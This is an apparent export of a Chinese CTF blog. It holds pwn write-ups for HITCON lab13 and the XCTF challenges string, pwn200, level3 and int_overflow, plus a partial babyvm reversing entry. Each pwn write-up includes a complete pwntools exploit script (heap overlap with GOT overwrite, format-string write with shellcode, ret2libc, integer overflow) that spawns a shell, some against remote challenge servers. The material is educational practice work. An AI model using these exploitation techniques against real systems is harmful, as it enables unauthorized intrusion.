<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[HITCON Trainging lab13]]></title>
      <url>/2020/04/16/HITCON-Trainging-lab13/</url>
      <content type="html"><![CDATA[<p>chunk-extend学习，一个友好的题目，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">下载地址</a></p>
<h3 id="0x00-程序分析"><a href="#0x00-程序分析" class="headerlink" title="0x00 程序分析"></a>0x00 程序分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>64位elf，开启了Canary和NX保护</p>
<p>分析main函数</p>
<p>大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针</p>
<ol>
<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 <a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">off-by-one</a>的漏洞</strong>。</li>
<li>展示堆，输出指定索引堆的大小以及内容。</li>
<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
</ol>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>函数edit_heap()</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586612923039.png" alt="1586612923039" title class>
                <p>1586612923039</p>
            </figure>
<p>heaparray[v1]中存放的是chunk的size,(*heaparray[v1]+1)其实就是heaparray[v1+1]中存放的是堆的指针。</p>
<p>分析create_heap()</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586613176346.png" alt="1586613176346" title class>
                <p>1586613176346</p>
            </figure>
<p>heaparray就在堆上,可以直接改heaparray上的指针。</p>
<p>基本利用思路:</p>
<ol>
<li>利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
</ol>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">heap = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">"ddaa"</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">＃将堆<span class="number">1</span>的结构大小改写为<span class="number">0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">＃触发堆<span class="number">1</span>的结构到fastbin <span class="number">0x40</span></span><br><span class="line">＃将<span class="number">1</span>的内容堆到fastbin <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">＃新堆<span class="number">1</span>的结构将指向旧堆<span class="number">1</span>的内容，大小为<span class="number">0x20</span></span><br><span class="line">＃新堆<span class="number">1</span>的内容将指向旧堆<span class="number">1</span>的结构，大小为<span class="number">0x30</span></span><br><span class="line">＃也就是说我们可以覆盖新堆<span class="number">1</span>的结构</span><br><span class="line">＃在这里，我们将其堆内容指针覆盖为free @ got</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak freeaddr</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#用系统地址覆盖free @ got</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>最后，记录下一位师傅做到<a href="https://blog.csdn.net/qq_40934487/article/details/91465347" target="_blank" rel="noopener">一道堆题的博客</a></p>
<p>​     </p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,string]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/</url>
      <content type="html"><![CDATA[<h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00  函数分析"></a>0x00  函数分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/string&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>64位，开启了Canary和NX保护， RELRO。</p>
<p>载入IDA,分析逻辑，进入函数sub_400D72(),有三个函数， sub_400A7D();<br>sub_400BB9(); sub_400CA6((_DWORD *)a1);</p>
<p>函数sub_400BB9();</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585958469569.png" alt="1585958469569" title class>
                <p>1585958469569</p>
            </figure>
<p>存在格式化字符串漏洞，可以进行任意地址写。</p>
<p> 函数sub_400CA6((_DWORD *)a1)</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585958551908.png" alt="1585958551908" title class>
                <p>1585958551908</p>
            </figure>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585958656637.png" alt="1585958656637" title class>
                <p>1585958656637</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br></pre></td></tr></table></figure>
<p>这条指令将v1强制转化为函数指针类型，再汇编代码中可以看到，转化后调用；</p>
<p>执行这条语句的条件是*a1 == a1[1]，a1为传入的参数，回溯发现a1即函数sub_400D72传入的v4，而v4 = (__int64)v3，其中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v3 = 68;   <span class="comment">#即v3[0] = 68;</span></span><br><span class="line">v3[1] = 85;</span><br></pre></td></tr></table></figure>
<p>即要令<em>a1 == a1[1]，则需要</em>v3 == v3[1]。需要修改v3[0]为85</p>
<p>而v3[0]的地址则在，main函数内可得到</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585959372877.png" alt="1585959372877" title class>
                <p>1585959372877</p>
            </figure>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>根据程序流程执行输入，函数sub_400A7D()中注意输入east即可跳出;进入函数sub_400BB9()。</p>
<p>在64位程序函数调用约定，前六个参数从左到右放入<em>RDI</em>, <em>RSI</em>, <em>RDX</em>, <em>ECX</em>, <em>R8</em>, <em>R9</em>中，利用<strong>格式化字符串漏洞</strong>，进入脆弱点，写入shellcode。可参考大佬博客</p>
<p><a href="https://blog.csdn.net/xkj2010yj/article/details/104648885?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1" target="_blank" rel="noopener">https://blog.csdn.net/xkj2010yj/article/details/104648885?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1</a></p>
<p>所以从n = 7开始，我们可以修改栈中的数据为85。</p>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process(&apos;./string&apos;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,41867)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;secret[0] is &apos;)</span><br><span class="line">v3_addr = int(sh.recvuntil(&quot;\n&quot;),16)</span><br><span class="line">print(v3_addr)</span><br><span class="line">sh.recvuntil(&apos;name be:&apos;)</span><br><span class="line">sh.sendline(&apos;zzz&apos;)</span><br><span class="line">sh.recvuntil(&apos;east or up?:&apos;)</span><br><span class="line">sh.sendline(&apos;east&apos;)</span><br><span class="line">sh.recvuntil(&apos;leave(0)?:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;\&apos;Give me an address\&apos;&apos;)</span><br><span class="line">sh.sendline(str(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;you wish is:&apos;)</span><br><span class="line">payload = &apos;%085d&apos; + &apos;%7$n&apos;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;I will help you! USE YOU SPELL&apos;)</span><br><span class="line">sh.sendline(asm(shellcraft.amd64.linux.sh(),arch=&quot;amd64&quot;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,pwn200]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn200/</url>
      <content type="html"><![CDATA[<h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/pwn-200&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位，开启了NX保护</p>
<p>载入IDA，反汇编看主函数</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585978770147.png" alt="1585978770147" title class>
                <p>1585978770147</p>
            </figure>
<p>函数sub_8048484()</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585978830995.png" alt="1585978830995" title class>
                <p>1585978830995</p>
            </figure>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>主要思路如下：</p>
<ul>
<li>利用DynELF泄露system地址 <a href="https://www.anquanke.com/post/id/8512" target="_blank" rel="noopener">DynELF方法参考</a></li>
<li>调用read函数，把‘/bin/sh‘写入bss段，作为system参数</li>
<li>调用system函数，getshell</li>
</ul>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">p=remote(&quot;111.198.29.45&quot;,30318)</span><br><span class="line">elf=ELF(&apos;./pwn-200&apos;)</span><br><span class="line">start=0x80483D0 </span><br><span class="line">write_addr=elf.plt[&apos;write&apos;]</span><br><span class="line">read_addr=elf.plt[&apos;read&apos;]</span><br><span class="line">def leak(addr):</span><br><span class="line">	payload=&apos;a&apos;*112+p32(write_addr)+p32(start)+p32(1)+p32(addr)+p32(4)</span><br><span class="line">	p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	buff=p.recv(4)</span><br><span class="line">	return buff</span><br><span class="line">dyn=DynELF(leak,elf=ELF(&quot;./pwn-200&quot;))</span><br><span class="line">system=dyn.lookup(&quot;system&quot;,&quot;libc&quot;)</span><br><span class="line">print(&quot;get system address:%X&quot; % system)</span><br><span class="line">def write():</span><br><span class="line">	bin=&quot;/bin/sh&quot;</span><br><span class="line">	bss=0x804A048#使用bss结尾处的内存区域，read之后跳转到start，程序会再次修改stdin和stdout的值</span><br><span class="line">	payload=&apos;a&apos;*112+p32(read_addr)+p32(start)+p32(0)+p32(bss)+p32(8)</span><br><span class="line">	p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.sendline(bin)</span><br><span class="line">write()</span><br><span class="line">payload=&apos;a&apos;*112+p32(system)+p32(0)+p32(0x804A048)</span><br><span class="line">p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,level3]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3/</url>
      <content type="html"><![CDATA[<p>下载后解压两次，给了一个elf 和并且告诉libc版本</p>
<p>分享一位师傅写得，很详细，对我们小白很有帮助</p>
<p><a href="https://www.cnblogs.com/cloud-tree/p/11929585.html" target="_blank" rel="noopener">https://www.cnblogs.com/cloud-tree/p/11929585.html</a></p>
<h2 id="攻防世界-新手区-level3"><a href="#攻防世界-新手区-level3" class="headerlink" title="攻防世界 新手区 level3"></a>攻防世界 新手区 level3</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/level3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位，开启NX保护</p>
<p>载入IDA</p>
<p>main函数</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585968083816.png" alt="1585968083816" title class>
                <p>1585968083816</p>
            </figure>
<p><em>vulnerable_function</em>函数</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585968097663.png" alt="1585968097663" title class>
                <p>1585968097663</p>
            </figure>
<p>程序代码很少，在read()存在栈溢出</p>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>无system函数，无binsh字符串，有read和write函数，利用ret2libc。</p>
<p>主要思路有以下几点：</p>
<ul>
<li>libc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。</li>
<li>在vulnerable_function()中，先调用了write()函数，然后调用read()函数。第一次攻击利用write()函数返回到vulnerable_function()后，再进行read()函数调用，这样就进行二次攻击。 </li>
<li>第一次攻击我们利用栈溢出将write()函数在got表中的真实地址泄露出来，然后减去libc中的offset，就可以得到libc的base address。</li>
<li>再利用相对offset计算出system和”/bin/sh”的真实地址</li>
<li>第二次攻击重新进入vulnerable_function()函数，再次通过栈溢出，利用system函数进行getshell。</li>
</ul>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&apos;111.198.29.45&apos;,58174)</span><br><span class="line">#p=process(&apos;./level3&apos;)</span><br><span class="line">elf=ELF(&quot;./level3&quot;)</span><br><span class="line"></span><br><span class="line">writeplt=elf.plt[&quot;write&quot;]</span><br><span class="line">writegot=elf.got[&quot;write&quot;]</span><br><span class="line">func=elf.symbols[&quot;vulnerable_function&quot;]</span><br><span class="line"></span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">writelibc=libc.symbols[&quot;write&quot;]</span><br><span class="line">syslibc=libc.symbols[&quot;system&quot;]</span><br><span class="line">binlibc=libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line"></span><br><span class="line">payload1=&apos;a&apos;*140+p32(writeplt)+p32(func)+p32(1)+p32(writegot)+p32(4)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">addr=p.recv(4)</span><br><span class="line">writeaddr=u32(addr)</span><br><span class="line"></span><br><span class="line">sysaddr=writeaddr-writelibc+syslibc</span><br><span class="line">binaddr=writeaddr-writelibc+binlibc</span><br><span class="line"></span><br><span class="line">payload2=&apos;a&apos;*140+p32(sysaddr)+p32(0xaaaa)+p32(binaddr)</span><br><span class="line">p.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,int_overflow]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/</url>
      <content type="html"><![CDATA[<p>攻防世界 新手区  整数溢出</p>
<p>0x00 函数分析</p>
<p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位，开启NX保护</p>
<p>载入IDA，诶，看到了一个</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964727164.png" alt="1585964727164" title class>
                <p>1585964727164</p>
            </figure>
<p>看来不用自己去构造了，看看怎么调用就可以了。</p>
<p>继续分析，发现了重要得函数check_passwd，进入</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964928961.png" alt="1585964928961" title class>
                <p>1585964928961</p>
            </figure>
<p>条件满足v3&gt;3u且v3&lt;8u时，可以进入下面的else中，在strcpy处有存在溢出</p>
<p>0x01 漏洞利用</p>
<p>想要利用else中得strcpy，需要控制passwd得长度，第一种方法是passwd长度&gt;3 &amp;&amp; &lt;=8，第二种是是利用整数溢出。</p>
<p>而在限制passwd长度，即v3时，汇编代码中为s</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585966010822.png" alt="1585966010822" title class>
                <p>1585966010822</p>
            </figure>
<p>在检测s的长度之后，可以看到程序把s放到一个al寄存器中，al是一个八位寄存器，八位寄存器对于无符号整数来说范围是有0~255，所以利用整数溢出，则passwd得长度应为259~264。</p>
<p>第一种passwd太短，无法利用进行改写程序流，所以使用第二种思路。</p>
<p>程序中存在，可以将返回地址指向what_is_this()</p>
<p>0x02 exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./int_overflow&apos;)</span><br><span class="line">sys_addr=0x0804868B</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;Please input your username:\n&quot;)</span><br><span class="line">p.sendline(&quot;aaa&quot;)</span><br><span class="line">p.recvuntil(&quot;Please input your passwd:\n&quot;)</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*24+p32(sys_addr)</span><br><span class="line">payload=payload.ljust(260,&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[babyvm]]></title>
      <url>/2020/01/16/babyvm/</url>
      <content type="html"><![CDATA[<h1 id="0x0-函数分析"><a href="#0x0-函数分析" class="headerlink" title="0x0  函数分析"></a>0x0  函数分析</h1><p>载入IDA，F5查看主函数</p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579175642703.png" alt="1579175642703" title class>
                <p>1579175642703</p>
            </figure>
<p>有三个函数，进一步查看</p>
<p><strong>sub_400839</strong></p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579176105200.png" alt="1579176105200" title class>
                <p>1579176105200</p>
            </figure>
<p>此函数为VM的初始化过程，6010A0为vm操作码的内容，0xf1代表sub_400738函数，0xf2代表sub_4006B6函数，0xf5代表sub_4006F4函数</p>
<p><strong>unk_6010A0内容（截取部分）</strong></p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579177072366.png" alt="1579177072366" title class>
                <p>1579177072366</p>
            </figure>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579177089451.png" alt="1579177089451" title class>
                <p>1579177089451</p>
            </figure>
<p><strong>sub_400738（0xf1）</strong></p>
<figure class="image-box">
                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579177178288.png" alt="1579177178288" title class>
                <p>1579177178288</p>
            </figure>
<p>分析可知0xF1代表的是MOV指令，操作数0xE1,0xE2,0xE3,0xE4各自代表不同的寄存器赋值。其中0xE4表示将寄存器赋值给栈s中。</p>
<p><strong>sub_4006B6  (0xf2)</strong></p>
<figure class="image-box">
